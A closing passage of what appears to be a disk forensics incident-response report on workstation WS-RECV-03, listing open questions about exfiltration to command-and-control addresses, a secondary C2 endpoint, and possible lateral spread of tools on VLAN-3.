+            of approximately 14 MB and 12 MB to the C2 IPs at
+            2026-05-08 02:38 and 2026-05-11 03:17 CDT
+            respectively.
+
+  [OPEN-B]  Was there any evidence on disk of secondary C2 setup
+            (the 203.0.113.47:8443 connection from memory)?
+            Disk forensics did NOT find a hardcoded reference to
+            this IP in svchost_update.exe (the binary uses the
+            sync.healthbane-c2.net DNS-resolved C2; the secondary
+            IP must have been delivered as a directive in a C2
+            response).  This means the binary on disk does not
+            self-disclose the secondary C2; firewall logs are the
+            primary evidence source.
+
+  [OPEN-C]  Did any other workstation on VLAN-3 receive a copy of
+            debug_tool.exe or PsExec64.exe?  Disk forensics on
+            WS-RECV-03 alone cannot answer this.  The 4x05 IR
+            scope is WS-RECV-03 ONLY (per scoping decision noted
+            in 4x04 R5).  Other-host disk forensics is a follow-up
+            recommendation only.
+
+================================================================================
+END OF DISK FORENSICS REPORT
+================================================================================
